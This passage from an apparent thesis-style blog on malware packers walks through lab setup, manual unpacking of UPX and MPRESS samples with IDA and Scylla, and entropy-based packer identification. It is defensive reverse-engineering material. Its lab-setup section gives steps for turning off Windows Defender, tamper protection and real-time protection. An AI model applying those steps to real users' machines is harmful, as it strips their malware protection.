would typically execute in a real-world environment.</p>","<p>However, there are also some limitations to hybrid analysis. For example, some malware may be designed to detect the presence of a VM or sandbox by implementing checks on the number of cores, number of RAM, and other metrics to understand if it is running in a genuine or controlled environment and alter its behaviour accordingly.</p>"]}]},{"id":"5 Simple packing and unpacking techniques","title":"<h2> <span style=\\"color:#da1953\\">5 Si</span>mple packing and unpacking techniques</h2>","body":[{"id":"5.1 Premise","title":"<h3>5.1 Premise</h3>","body":["<p>This chapter will further introduce packers and give some in depth knowledge about internal structure of a Portable Executable (PE) file thave a good understanding of each unpacking steps performed later on. Additional it will present a detailed guide on how to carry out static andynamic analysis, highlighting their key differences as well as their pros and cons. The tools required for each step will be listed and explainein order to provide a comprehensive understanding. The environment setup will also be described so that it can be replicated and the reasoninbehind such a strategy can be understood. The main objective of this chapter is to demonstrate a possible method of unpacking UPX and MPRESpackers in detail and provide insights into the expected outcomes.</p>"]},{"id":"5.2 Popular packers","title":"<h3>5.2 Popular packers</h3>","body":["<p>UPX and MPRESS are two popular packing commonly used in malware packing. UPX is an open-source executable packer that can compress executables and DLLs without damaging or changing the original code and it is completely self-contained. It uses a combination of multiple compression algorithms, including LZMA, Huffman coding, and Run Length Encoding (RLE), to compress the code. UPX supports a wide range of executable formats, such as Windows PE and Linux ELF. UPX is widely used by malware authors as it is easy to use and can quickly compress executables.</p>","<p>UPX is a popular packer in the malware development community due to its effectiveness in reducing the size of the executable and the availability of both encryption and compression. However, it is also well-known among security researchers and antivirus vendors, and many have developed signatures and heuristics to detect and analyze UPX-packed executables. As a result, malware developers have increasingly turned to more sophisticated packing algorithms, such as MPRESS, to evade detection.</p>","<p>On the other hand, the MPRESS packing is well known for its ability to hardly compress malware to make it harder to be detected and significantly reduce its size. It achieves this by replacing large sections of the original code with compressed and encrypted versions. The algorithm then adds the stub to compress/decompress the original code at runtime, making it difficult for static analysis tools to detect the true purpose of the malware.</p>","<p>MPRESS uses a variety of advanced techniques to make it difficult for analysts to reverse engineer the packed code. It uses a custom stub to pack and unpack the code, which makes it difficult for anti-virus software to detect and unpack the malware. The algorithm also uses anti-debugging techniques to prevent analysts from debugging the packed code or altering its execution in any way.</p>","<p>One of the main advantages of MPRESS is its speed and efficiency it has. The packing process is relatively fast, and the resulting packed file is highly compressed, which reduces the overall size of the file. This makes it easier for malware authors to distribute the packed file by being stealthier.</p>","<p>It is common among malware writers to create their own custom versions of packers. UPX is an open-source tool, which means that the source code is accessible and can modify it as needed. However, creating a custom version of a packer is not a trivial task and requires a good understanding of assembly language, binary file formats, and compression algorithms. In the case of MPESS is even harder as it is a proprietary packer and creating a custom version requires to reverse engineer it. By doing so malware writers will go against its license agreement.</p>","<p>Although a custom packer may not be as effective as the original packer in terms of compression ratio and speed, the main goal of malware writers is to make the malware less detectable possible and harder to be analyzed. Malware writers often introduce additional peace of code in order to change the malware signature to evade security systems or to deviate from the analyst analysis by introducing anti-analysis techniques.</p>"]},{"id":"5.3 Import address table (IAT)","title":"<h3>5.3 Import address table (IAT)</h3>","body":["<p>It is very important to introduce the concept of Import Address Table (IAT) to understand all the steps of malware analysis later on. In particular to understand the process of extracting and creating the PE file containing the unpacked code from a packed file.</p>","<p>The Import Address Table (IAT) is a crucial component in PE (Portable Executable) files used on Windows-based systems. The IAT is responsible for storing pointers to functions that are imported from other DLLs (Dynamic-Link Libraries), which is an essential part of allowing a program to call functions that are not part of its own code. This is a fundamental aspect of modular and maintainable programming.</p>","<p>During the resolution stage of a typical Windows PE executable, the header of the executable contains essential metadata that informs the operating system about the symbols from external libraries that the executable relies upon. When the operating system\'s loader processes the executable, it loads the necessary libraries into memory if they are not already loaded. The loader then assigns the addresses of the imported symbols to specific memory locations as specified by the metadata within the executable.</p>","<p>To clarify the image below, the IMAGE_IMPORT_BY_NAME  is a structure within the Import Address Table (IAT). It is used to store the import information for a specific function, including the function name and its corresponding hint value . The IMAGE_IMPORT_BY_NAME structure is employed when the import is performed using the name of the function, rather than its ordinal value, which are the two methods to import functions.</p>","<p>The Import Name Table (INT) stores the names of the imported functions from external DLLs. The Import Address Table (IAT) is responsible for holding the addresses of the imported functions after they have been resolved by the loader. It is an array of function pointers located within the PE file\'s data section. The IAT is populated by the loader with the actual addresses of the imported functions.</p>","<p>The purpose of the IMAGE_IMPORT_BY_NAME structure is to provide the necessary information for importing a function by its name. It contains the name of the function and its corresponding hint value, which is an index into the export name table of the DLL. The IMAGE_IMPORT_BY_NAME structure is used when the loader needs to resolve an imported function by name rather than by ordinal .</p>","<p>In the context of the IMAGE_IMPORT_BY_NAME structure in the Portable Executable (PE) format, the Hint value is an optional field that provides an additional hint to help identify the imported function. The Hint value is typically an index or position of the function within the export table of the DLL from which it is being imported. It allows for faster and more efficient resolution of imported functions, especially when the import code knows the specific Hint value to look for.</p>","<p><img src=\\"/cyber/blog/thesis/9.png\\" alt=\\"\\"></p>","<p>However, in the case of packed executables created by packers, this metadata is often modified. Packers take on the responsibility of performing the resolution stage themselves instead of relying on the operating system\'s loader.</p>","<p>Packers typically employ techniques to handle the resolution of symbols and imported libraries internally. They analyze the packed executable, identify the required symbols, and dynamically resolve their addresses within the packed code. This allows the packed executable to function without relying on the standard resolution mechanism provided by the operating system\'s loader. By bypassing the standard resolution stage, packers can modify the structure of the executable and hide important information about dependencies, making it more challenging for reverse engineers and analysis tools to understand the executable\'s inner workings.</p>","<p>It\'s worth noting that the resolution stage performed by packers may vary depending on the specific packing technique used and the goals of the packer. Some packers may prioritize minimizing the size of the executable and focus on simple resolution mechanisms, while others may employ more advanced techniques to evade detection and analysis.</p>","<p>The IAT reconstruction is a feature of tools like Scylla <sup>[6]</sup>, typically involves scanning the binary of a loaded module (a process\'s executable image in memory) and identifying patterns that match the standard structure of an IAT. In other words, it\'s looking for arrays of memory addresses that point to valid locations within loaded DLLs. This process is often needed when analyzing malware or reversing a packed executable, where the IAT may be altered.</p>","<p>Once potential IAT locations are identified, the tool can often rebuild a valid IAT, allowing the binary to be dumped from memory and run as a standalone executable. This can be incredibly useful in malware analysis and similar reverse engineering tasks.</p>"]},{"id":"5.4 Environment Setup","title":"<h3>5.4 Environment Setup</h3>","body":["<p>For this setup, I opted to use a virtualized environment, specifically VMware Workstation<sup>[2]</sup> with Windows 10 Operating System. I chose Windows as several malware samples are readily available, and it is the most widely used and targeted operating system. Additionally, some critical tools are only accessible on Windows. While compatibility layers can allow these tools to be used on other operating systems such as Linux, their proper execution cannot be guaranteed.</p>","<p>To ensure efficient performance, I configured the Operating System with the minimum requirements of 4GB of RAM, 60GB of storage, and 4 cores, as the tools utilized are lightweight and do not require significant computational power. I made certain modifications within the Operating System such as disabling the Windows 10 Virus and Threat Protection. This was necessary to prevent Windows 10 from detecting the malware samples as malicious files and automatically deleting them.</p>","<p>Some other steps can be performed according to the needs:</p>","<p>To Disable Windows Defender</br><ol><li>Open Windows Security (type Windows Security in the search box)</li><li>Virus & threat protection → Virus & threat protection settings → Manage settings.</li><li>Switch Tamper Protection to Off</li></ol></p>","<p>To permanently disable Real Time Protection</br><ol><li>Open Local Group Policy Editor (type gpedit in the search box)</li><li>Computer Configuration → Administrative Templates → Windows Components → Microsoft Defender Antivirus → Real-time Protection</li><li>Enable Turn off real-time protection.</li><li>Reboot</li></ol></p>","<p>To permanently disable Microsoft Defender:</br><ol><li>Open Local Group Policy Editor (type gpedit in the search box)</li><li>Computer Configuration → Administrative Templates → Windows Components → Microsoft Defender Antivirus</li><li>Enable Turn off Microsoft Defender Antivirus</li><li>Reboot</li></ol></p>","<p>Disabling or removing the virtual machine\'s network card is a crucial step to prevent malware from communicating externally and causing unintentional malicious traffic. It is also important to keep the virtualization software, in my case VMware, up to date with the latest version to avoid exploitation of known vulnerabilities that could potentially allow the malware to escape the virtual environment and infect the host machine.</p>"]},{"id":"5.5 UPX","title":"<h3>5.5 UPX</h3>","body":["<p>For this demonstration of unpacking malware packed with UPX, I will be using the following tools:</br><ul><li>PEStudio <sup>[3]</sup></li><li>Detect It Easy <sup>[4]</sup></li><li>IDA (Free) <sup>[5]</sup></li><li>Scylla <sup>[6]</sup></li></ul></p>","<p>Before diving into how and why these tools are used, let\'s first introduce them and their purpose. PEStudio <sup>[3]</sup> provides information about malware and potential behavior, allowing us to gain an idea of what it might be. The tool also indicates whether a file is malicious or not, drawing from different sources. For example, it may analyze strings within the file that indicate modifications to registry keys, libraries, or imports that usual software do not contain or often used by malware. However, this can also result in many false positives. Additionally, PEStudio <sup>[3]</sup> provides an important indication of the presence of packers through the entropy value, which gives an indication of the file\'s level of compression.</p>","<p>DetectItEasy is a software tool that provides a straightforward approach to detecting the presence of packers. Its capabilities are similar to those of PEStudio <sup>[3]</sup> in terms of packer detection and using multiple tools can be useful in confirming the presence of packing.</p>","<p>IDA (Free) <sup>[5]</sup>, a free version of IDA <sup>[5]</sup> with limited functionality is mainly used to analyze the code inside the malware and to evaluate the malware behavior. In this case, we will use IDA <sup>[5]</sup> to find the tail jump (as described in “Dynamic Analysis” chapter) in the case of UPX and the Original Entry Point (OEP) in the case of MPRESS.</p>","<p>Finally, we can utilize Scylla <sup>[6]</sup> to reconstruct the Import Address Table (IAT) of the unpacked code, dump the unpacked code from memory onto the disk and create a new executable file that includes only the original code.</p>",{"id":"5.5.1 Packing Indicators","title":"<h4>5.1.1 Packing indicators</h4>","body":["<p>In this section, we will attempt to collect all the evidence and indications of packing. This is the initial step in confirming the presence of packers and, if possible, identifying the packer\'s name. To accomplish this, we will utilize both PEStudio <sup>[3]</sup> and Detect it Easy <sup>[4]</sup> (DIE) and compared their results to ensure their similarity. It\'s important to note that despite performing the same task of detecting packer presence, their outcomes may differ slightly, potentially resulting in minor discrepancies in the result.</p>","<p>The first step to perform is to load the binary with Detect It Easy <sup>[4]</sup> and analyze the information it provided. </p>","<p><img src=\\"/cyber/blog/thesis/10.png\\" alt=\\"\\"></p>","<p>After loading the binary with Detect It Easy <sup>[4]</sup>, it reveals that it was indeed packed with UPX and even provided version number 3.93. This information is crucial for the subsequent unpacking process.</p>","<p>In addition to the packing information, Detect It Easy <sup>[4]</sup> also provide us with the number of sections present in the binary. This is important as it allow us to cross-check the section count with that reported by other tools. Discrepancies between section counts could indicate malicious activity such as section padding or code injection.</p>","<p>Another important piece of information that we obtained from Detect It Easy <sup>[4]</sup> was the entropy value of the binary. Entropy is a measure of the randomness of the data in the binary. In the context of malware analysis, it can help indicate the presence of obfuscation or encryption techniques used by the malware author to evade detection.</p>","<p><img src=\\"/cyber/blog/thesis/11.png\\" alt=\\"\\"></p>","<p>After loading the binary into Detect It Easy <sup>[4]</sup>, we can further check if it was packed or not. High entropy in a binary is usually a good indication of packing, but sometimes it can show that the binary is not packed even though it has a high level of entropy. For this sample I have a value of 7.09, the value is very high, and it is a clear indication of packing.</p>","<p>We also need to check the type of binary, which we can do by checking the H-hexadecimal key in the main window of Detect It Easy <sup>[4]</sup>. Although we already know it was a PE (Portable Executable), we just want to be sure.</p>","<p>The binary had the character \\"MZ\\", as shown below, which indicates that it is a PE. However, it is possible for attackers to change these characters to disguise the true type of the binary. Therefore, we also check the number of next bytes to verify if it was really a PE or not.</p>","<p><img src=\\"/cyber/blog/thesis/12.png\\" alt=\\"\\"></p>","<p>At this point, we can used PEStudio <sup>[3]</sup> to gather more information about the binary and to confirm whether it is packed or not and if the results from both tools are similar. The first thing we must check is the size of the binary to get an idea of what we are dealing with. It is unlikely to have few imports if the file is very large, while for a small file, it is plausible but not certain. Therefore, it is best not to trust. For this sample the size 9728 bytes is in the norm, and the number of imports (18 imports) are not adequate. In general, programs of small to medium complexity already include a large number of functions imported from external libraries, a number that easily can cross 50 imports.</p>","<p><img src=\\"/cyber/blog/thesis/13.png\\" alt=\\"\\"></p>","<p>Here, in addition to the file size, we also see the entropy (7,114) which is very high, close to Detect It Easy’s <sup>[4]</sup> value and therefore it seems that it is packed. The Signature is further confirming that it is packed with UPX.</p>","<p>The next indicator can be found in the sections, in particular “Virtual-Size” and “Raw-Size” of the sections. If at last in one of them, the difference is so high it’s a good indicator of packing.</p>","<p>If at least one section has a very high entropy, then it is another good indicator of packing (MAX-Entropy: 8), also if at least one section has WX (Writable and Executable) permission is also an indicator of packing.</p>","<p>In the following image, it is evident that the UPX0 section exhibits significant differences in both virtual size and raw size. Furthermore, the UPX1 section displays a notably high entropy value of 7168. These observations provide further confirmation of the packer\'s presence within the malware.</p>","<p><img src=\\"/cyber/blog/thesis/14.png\\" alt=\\"\\"></p>","<p>Now we can check the imports, if they are so few it’s a good indicator of packing, if “GetProcess” and “LoadLibraryA” are the only imports shown in the PEStudio [3] then we can be sure that the binary is packed.</p>","<p><img src=\\"/cyber/blog/thesis/15.png\\" alt=\\"\\"></p>","<p>In this particular case, we have very few imports but there may be cases where we have only the previously mentioned imports. Finally, in the list of strings, we search for the presence of the packer\'s name. And to make the search easy we can reorder the list in ascending order as the packer names are very short.</p>","<p><img src=\\"/cyber/blog/thesis/16.png\\" alt=\\"\\"></p>","<p>It is important to note that while we have confirmed the presence of the UPX packer at the beginning, the subsequent checks were conducted for the sake of completeness. While identifying the packer and its name was straightforward for this sample, more sophisticated malware samples may present more significant challenges, requiring the identification of additional indicators. Malware authors often employ tactics such as altering section names and signatures to make detecting the packer more difficult. The steps outlined in this analysis apply to any malware; however, they may not always suffice, and in some cases, code analysis using IDA <sup>[5]</sup> may be necessary to determine the specific packer employed, particularly in the case of custom packers.</p>","<p>Now that we made sure that the binary was packed, we will outline the process of how to unpack it, and the two cases where it was packed with MPRESS and the case where it was packed with UPX.</p>","<p>For the first part, we used a packed binary with UPX, but the results of PEStudio <sup>[3]</sup> and Detect It Easy <sup>[4]</sup> would have been almost identical if the file had been packed with MPRESS.</p>"]},{"id":"5.1.2 Manual Unpacking of UPX","title":"<h4>Manual Unpacking of UPX</h4>","body":["<p>In this section, the code will be analyzed using IDA <sup>[5]</sup> to identify the packed code and extract it into a new Portable Executable (PE) file, aiming to recreate the original file. It\'s important to note that the resulting file is typically very similar but rarely identical to the original file, despite executing in the same manner. This process is essentially the reverse of what was described in the \\"How Packers Work\\" section.</p>","<p><img src=\\"/cyber/blog/thesis/17.png\\" alt=\\"\\"></p>","<p>To perform the unpacking, we use IDA <sup>[5]</sup>. Any version is fine, but in our case, we ca use IDA Free <sup>[5]</sup> and loaded the binary as a PE file.</p>","<p><img src=\\"/cyber/blog/thesis/18.png\\" alt=\\"\\"></p>","<p>After loading the binary in IDA <sup>[5]</sup>, it warns us that certain imports are not visible and that the IAT (Import Address Table) is located outside of the memory range. This was a clear indication that the binary was packed.</p>","<p><img src=\\"/cyber/blog/thesis/19.png\\" alt=\\"\\"></p>","<p>In order to unpack UPX, we have to search for a specific type of jump called a \\"tail jump\\". This term refers to the jump\'s typical location at the end of the program, but this is not always the case. The \\"tail jump\\" had a particular characteristic in that it traversed from one program section to another, making it a long jump.</p>","<p><img src=\\"/cyber/blog/thesis/20.png\\" alt=\\"\\"></p>","<p>Here we have a jump in the UPX1 section which went to another section and jumped to address 402284 which is UPX0.</p>","<p><img src=\\"/cyber/blog/thesis/21.png\\" alt=\\"\\"></p>","<p>Upon examining the code, we can observe that the address 402284 belongs to the UPX0 section and there are no similar jumps elsewhere, indicating that we have successfully identified the tail jump.</p>","<p>Next, we set a breakpoint at address 402284 and execute the binary and the resulting message serves as further confirmation that the binary has been packed.</p>","<p><img src=\\"/cyber/blog/thesis/22.png\\" alt=\\"\\"></p>","<p>After pressing “Yes” and continuing the execution, the code has been changed, and I could see the hidden portion of the code previously packed.</p>","<p><img src=\\"/cyber/blog/thesis/23.png\\" alt=\\"\\"></p>","<p>We were at a \\"call\\" statement, which was the correct position for me to be in. At that point, we can use either the address of the jump instruction (402284) or the address (402558) as the OEP (Original Entry Point), and both addresses would have worked well.</p>","<p>To unpack, we utilize Scylla <sup>[6]</sup> and use one of the two addresses as input in the OEP field. Throughout these processes, we must keep IDA <sup>[5]</sup> running in debug mode and avoided closing it.</p>","<p>The next steps to perform in Scylla [6] are the following:</br><ol><li>Select the process of IDA <sup>[5]</sup> running the sample.</li><li>Insert in the OEP field the address found on IDA <sup>[5]</sup>.</li><li>Click “IAT Autosearch”</li></ol></p>","<p>These steps ensures that Scylla <sup>[6]</sup> can read from the process memory the unpacked code and extract it to recreate the executable file. In particular Scylla <sup>[6]</sup> starts to read from the OEP address and search for patters that match potential IAT (Import Address Table) to reconstruct it and create a new PE file with correct header and the unpacked code.</p>","<p>As we correctly provided the address Scylla <sup>[6]</sup> easily found the IAT. It is a good practice to restart Scylla <sup>[6]</sup> every time to ensure that it successfully finds the start address and size. This is necessary because Scylla <sup>[6]</sup> can be buggy and may not always provide accurate results.</p>","<p><img src=\\"/cyber/blog/thesis/24.png\\" alt=\\"\\"></p>","<p>At that point, we are able to obtain the imports by simply clicking on \\"Get Imports\\".</p>","<p><img src=\\"/cyber/blog/thesis/25.png\\" alt=\\"\\"></p>","<p>84 imports are found, and since we own the unpacked binary, we can double-check if the number of found imports matches with what Scylla <sup>[6]</sup> found.</p>","<p>In fact, PEStudio <sup>[3]</sup> told us that the original unpacked binary had 84 imports (as shows below), so we can confirm that our process had been successful. To create the unpacked binary, we simply clicked on \\"Dump\\" and saved the file, and it will create a new executable.</p>","<p><img src=\\"/cyber/blog/thesis/26.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/blog/thesis/27.png\\" alt=\\"\\"></p>","<p>Then, click on \\"Fix Dump\\" and chose the dump that had been created previously to create the unpacked binary. It may not be identical to the original file, but it will be really close.</p>","<p><img src=\\"/cyber/blog/thesis/28.png\\" alt=\\"\\"></p>","<p>To further check, we load the new binary with PEStudio <sup>[3]</sup> against the packed file too see how they differ from each other.</p>","<p><img src=\\"/cyber/blog/thesis/29.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/blog/thesis/30.png\\" alt=\\"\\"></p>","<p>In the preview’s images, we are able to see the difference between the original packed binary and the unpacked binary that we have created. The first thing we notice is that the size of our file was much larger, which is expected. Another thing that we notice is that the import of the new unpacked binary is 0. This is actually a problem with Scylla <sup>[6]</sup>, as long as the import were showing in Scylla <sup>[6]</sup> there is no problem with the unpacked binary even if PEStudio <sup>[3]</sup> are not showing them. Lastly, we can see that there are a higher number of strings than before which is also an expected change in the binary.</p>","<p>And with that, concludes the manual unpacking of a packed binary with UPX.</p>"]}]},{"id":"5.6 Mpress","title":"<h3>5.6 MPRESS</h3>","body":["<p>Unpacking executable files that have been compressed and protected by the MPRESS packer involves a distinct process compared to the previously discussed UPX packer. While the initial steps to identify the presence of packing in a file remain the same, the subsequent unpacking process and analysis of the MPRESS-packed executables require a different approach.</p>","<p>Similar to the UPX packer, the first step involves conducting a preliminary analysis of the file using tools such as PEStudio <sup>[3]</sup> and DetectItEasy <sup>[4]</sup> to identify indicators of packing. These indicators include reduced numbers of imports, unusually small sections, significant differences between the virtual size and raw size of sections, and other relevant characteristics.</p>","<p>It is important to introduce concept of hardware breakpoint to understand the steps where it is involved and its difference from software breakpoint. A hardware breakpoint is a powerful debugging feature offered by modern processors and debuggers that allows software developers and analysts to pause the execution of a program at a specific memory address or when a particular condition is met. Hardware breakpoint is an essential tool for debugging complex software, analyzing malware, and investigating software vulnerabilities. These breakpoints are typically implemented using specialized registers called debug registers, which are part of the processor\'s debugging architecture.</p>","<p>To set a hardware breakpoint, the debugger configures one of the available debug registers with the desired memory address or condition. The debug register is then monitored by the processor, which halts program execution when any instruction attempts to read, write, or execute the specified address or the condition is met.</p>","<p>Given this introduction we can proceed to the process of identifying a packed binary with MPRESS which is identical to that of UPX, as shown above. Upon loading the binary packed with MPRESS we receive a similar message to the UPX one, but in this case, clearly stating that the file was packed.</p>","<p><img src=\\"/cyber/blog/thesis/31.png\\" alt=\\"\\"></p>","<p>Once the binary had been loaded, we are supposed to face a \\"pusha\\" instruction. If this is not the case, we can simply select the start function and insert a breakpoint.</p>","<p><img src=\\"/cyber/blog/thesis/32.png\\" alt=\\"\\"></p>","<p>Then, we run the binary, paying particular attention to the Stack View window (usually it is located in the bottom-right corner of the IDA <sup>[5]</sup> window).</p>","<p><img src=\\"/cyber/blog/thesis/33.png\\" alt=\\"\\"></p>","<p>Upon stepping over once we can notice that the addresses on the stack had changed (shown in the image below).</p>","<p><img src=\\"/cyber/blog/thesis/34.png\\" alt=\\"\\"></p>","<p>At this point, the stack is pointing to start. We have to step over until we come back again to “start” since the start appears twice on the stack, once at 9FF64 and once at 9FF68. In this example, it was enough to do “Step Over” twice.</p>","<p><img src=\\"/cyber/blog/thesis/35.png\\" alt=\\"\\"></p>","<p>Note that we started from the \\"pusha\\" instruction at 4512D7 and then moved to 4512DE. Then we right clicked on the stack address 19FF64 and followed it in the hex dump.</p>","<p><img src=\\"/cyber/blog/thesis/36.png\\" alt=\\"\\"></p>","<p>The “Hex View-1” window changed, and a byte gets highlighted.</p>","<p><img src=\\"/cyber/blog/thesis/37.png\\" alt=\\"\\"></p>","<p>At this point, we select the four bytes (DWORD) starting from D7 and put a breakpoint on it. We also set the breakpoint to be a hardware breakpoint with read and write permission (WR), in this case, IDA <sup>[5]</sup> automatically enables these permissions. Although it is possible to view and modify the breakpoint which we don’t need in this case.</p>","<p><img src=\\"/cyber/blog/thesis/38.png\\" alt=\\"\\"></p>","<p>At this point we run the binary with the Play button. Once the binary is running, at a certain point it hit the hardware breakpoint. This was done in search of the Original Entry Point (OEP).</p>","<p><img src=\\"/cyber/blog/thesis/39.png\\" alt=\\"\\"></p>","<p>IDA <sup>[5]</sup> then detected that RIP point is not in a defined address similarly as sees as of the UPX.</p>","<p><img src=\\"/cyber/blog/thesis/40.png\\" alt=\\"\\"></p>","<p>After pressing “Yes”, the code changes, and we are suddenly in a call instruction. When we stepped into it, IDA <sup>[5]</sup> told me the same message about RIP pointing to an undefined address. We cannot use the address of the call instruction (402BA6) as we did for UPX. Instead, we have to use the address pointed out by the call instruction (401B54).</p>","<p><img src=\\"/cyber/blog/thesis/41.png\\" alt=\\"\\"></p>","<p>Finally, the address 401B54 can be used as the Original Entry Point (OEP) and unpack with Scylla <sup>[6]</sup>. Once found the OEP the unpacking process with Scylla <sup>[6]</sup> is very much the same as the one seed for the UPX which we will perform to validate its correctness. It is important to remember to restart Scylla <sup>[6]</sup> due to its bug and as seen previously we cannot close IDA <sup>[5]</sup> which was in debugging mode to let Scylla <sup>[6]</sup> use the process in execution.</p>","<p>In order to unpack the steps to follow are the same as seen for UPX:</p>","<p><ol><li>Select the process of IDA <sup>[5]</sup> running the sample.</li><li>Insert in the OEP field the address found on IDA <sup>[5]</sup>.</li><li>Click “IAT Autosearch”</li></ol></p>","<p>Upon setting up Scylla <sup>[6]</sup> with the new values for the malware sample, it successfully finds the start address and its size.</p>","<p><img src=\\"/cyber/blog/thesis/42.png\\" alt=\\"\\"></p>","<p>At this point, we obtained all the imports by simply clicking “Get Imports”.</p>","<p><img src=\\"/cyber/blog/thesis/43.png\\" alt=\\"\\"></p>","<p>Scylla <sup>[6]>/sup> shows that 68 imports are found since we own the unpacked binary, we can double-checked if the found imports matched the original number of imports.</p>","<p><img src=\\"/cyber/blog/thesis/44.png\\" alt=\\"\\"></p>","<p>In fact, PEStudio <sup>[3]</sup> had told us that the unpacked binary had 68 imports, so our process was successful. Now to create the unpacked binary, we first create a dump by clicking on \\"Dump\\" and saved the new file. </p>","<p><img src=\\"/cyber/blog/thesis/45.png\\" alt=\\"\\"></p>","<p>Now we click “Fix Dump” and select the dump file previously created in order to unpack it and create the unpacked binary.</p>","<p><img src=\\"/cyber/blog/thesis/46.png\\" alt=\\"\\"></p>","<p>To make further check we can load the newly created binary in PEStudio <sup>[3]</sup> and compared it with the original packed binary to see their differences.</p>","<p><img src=\\"/cyber/blog/thesis/47.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/blog/thesis/48.png\\" alt=\\"\\"></p>","<p>Finally, we could see the differences between the original packed binary and the unpacked binary that we created. Much like UPX, even here, the same value changes, even if the change is not significant. The unpacked version with Scylla <sup>[6]</sup> has 0 imports, which was the same as UPX. It is not a problem as long as Scylla <sup>[6]</sup> has found all the imports during the process.</p>","<p>This concludes the manual unpacking of binaries packed of MPRESS.</p>"]}]},{"id":"6 Advanced Technique for Packer Identification","title":"<h2> <span style=\\"color:#da1953\\">Adv</span>anced Technique for Packer Identification</h2>","body":["<p>As we have seen, identifying whether a file is packed or not is very important and it is even more important to know beforehand which packer used to pack the malware. Malware writers often modify information regarding the packer within the executable to reduce the identification of the used packer by changing certain parameters such as the header or section names. In such a case the techniques shown earlier in section \\"UPX\\" may not be particularly effective and the amount of information obtained would be particularly reduced. </p>","<p>An advanced and innovative technic to identify the packer is proposed of the paper \\"Packer identification method based on byte sequences\\", which achieves the result by extracting some features from the packed fire executable. In particular this paper proposes a “packer identification method based on features extracted only from the code sections of binary executable files. Because the characteristics of code sections cannot be easily changed by malware developers <sup>[7]</sup>”.  The value of entropy and the frequency of bytes in the code section is used to extract these features.</p>","<p><i>“The Encrypted Section Extraction process identifies each section based on the header information of a packed executable file. After identifying sections in an executable file, the entropy scores of each section are calculated, and the section with the highest score is selected as an encrypted section. In the Feature Extraction process, features are extracted from the binary sequences of the encrypted section <sup>[7]</sup>”.</i></p>","<p>After extracting the features, they are analyzed with machine learning algorithms to analyze and identify the type of packer used and finally the results are evaluated to calculate the accuracy of the identification divided for each different packer used.</p>","<p>An overall process overview can be seen in the following image:</p>","<p><img src=\\"/cyber/blog/thesis/49.png\\" alt=\\"\\"></p>","<p>The first step of the process is to identify the section encrypted by the packer and this is done by calculating the entropy. Usually, PE files contain the name of the encrypted section as the table below shows. But this information is easily modified by malware writes to make the identification more challenging reason why the entropy is calculated in order to detect the encrypted section.</p>","<p><img src=\\"/cyber/blog/thesis/50.png\\" alt=\\"\\"></p>","<p><i>“Entropy is defined as a degree of disorder or uncertainty in a system <sup>[7]</sup>”</i>. A high number of entropies is a clear indication of encryption, and it is computed for each section of the PE file and the encrypted section will have a higher entropy compared to other section of the executable as sown in the image below.</p>","<p><img src=\\"/cyber/blog/thesis/51.png\\" alt=\\"\\"></p>","<p>These values can be misled the final result due to the fact that <i>“binary executable files can have null paddings at the end of a section, and these null paddings can affect the entropy score of the section. To mitigate the effects of null paddings, our scoring method calculates the entropy scores of byte sequences in n- byte sliding windows for a single section <sup>[7]</sup>”</i>. </p>","<p><img src=\\"/cyber/blog/thesis/52.png\\" alt=\\"\\"></p>","<p>In the proposed paper <sup>[7]</sup> the entropy is not only used to identify if an executable is packed or not but also to identify the packer itself because <i>“different packing algorithms are used by different packers; the statistical values of entropy values may also be different. Then, different statistical values can be used as features to identify different packers <sup>[7]</sup>”</i>.</p>","<p>Analyzing the byte sequence of an encrypted section and extracting features can reveal the packer as the encrypted section is a list of random byte values and different packer uses different encryption algorithm, they will generate different entropy sequence. To such purpose the encrypted section is analyzed byte-by-byte. <i>“The entropy score sequence is defined as a list of entropy values of byte sequences within the n -byte sliding window <sup>[7]</sup>”</i>. The following image shows an example of an executable packed with ASPack <sup>[29]</sup> and show and shows a unique pattern of entropy.</p>","<p><img src=\\"/cyber/blog/thesis/53.png\\" alt=\\"\\"></p>","<p>The paper also analyzed different packing algorithms and was able to find concrete values to distinguish the employed packer. Thus, these features shown in the image below can be used to distinguish different packers in use.</p>","<p><img src=\\"/cyber/blog/thesis/54.png\\" alt=\\"\\"></p>","<p>Until now we have seen one of the two proposed technique, feature extraction form entropy. Now let’s see the second technique which is the analysis of the byte sequence and how it can reveal the packer.</p>","<p>The strategy is to analyze all the bytes of the sections, the byte values between 0x00 and 0xFF and calculating the number of occurrences of each byte to generate the frequencies. One of the problems during this phase is that the byte 0x00 is also used as padding at the end of each section so all the bytes 0x00 that are at the end of a section will be ignored to generate an accurate result.</p>","<p>In the paper <sup>[7]</sup> two particular packers have been studied, UPX and ASPack and they generated respectively the following frequency graph:</p>","<p><img src=\\"/cyber/blog/thesis/55.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/blog/thesis/56.png\\" alt=\\"\\"></p>","<p>From the frequency analysis we can clearly distinguish the two packers in use and incorporate such information during the analysis process. Such information often is crucial as it may save time and speed up the analysis phase which is often time consuming for unknows or custom packers.</p>"]},{"id":"7 Advanced Packers","title":"<h2> <span style=\\"color:#da1953\\">7 Adv</span>anced Packers</h2>","body":["<p>So far, we have seen and analyzed very simple packers, it is important to describe the behaviour of more advanced packers to understand how far they can go. For this reason, I have chosen a very advanced packer to protect Windows software, Themida. Themida is a commercial packer, it implements state-of-the-art security measures to make it difficult and complicated to analyze.</p>","<p>The goal, in fact, is to avoid decompilation, and Themida, for this, falls well within the category of software protector. The problem that Themida effectively solves is that the techniques employed by classic packers are all mostly known, and they can be unpacked. The executable is first decompiled and broken down into portions, each of which is protected, and then reassembly and a second phase of protection of the entire file is performed, resulting in the final executable.</p>","<p>All processes are managed by an architecture based on virtual micro-machines (<i>“a virtual machine program that serves to isolate an untrusted computing operation <sup>[8]</sup>”</i>), each dedicated to real-time encoding and decoding of the pieces into which the executable is decomposed. Code virtualization, in Themida, can be managed in a granular manner, selecting the type of virtualization based on parameters such as execution speed (which is more or less affected depending on the technology chosen) and the size of the executable. And based on these parameters that the complexity of decoding and analysis of the processed files varies.</p>","<p>Below are few features of Themida that are noteworthy:</p>","<p><ol><li>Anti-API scanners techniques that avoid reconstruction of original import table.</li><li>Anti-memory dumpers techniques.</li><li>Anti-debugger techniques that detect/fool any kind of debugger.</li><li>Multiple polymorphic layers with more than 50.000 permutations.</li></ol></p>","<p>The Themida packer is a highly advanced and intricate tool used to protect software from reverse engineering and analysis. It incorporates multiple anti-analysis and evasion techniques, making it challenging to analyze using simple methods.</p>","<p>Another very famous packer among malware writers’ worth mentioning is Armadillo. When Armadillo is run it creates two separate processes 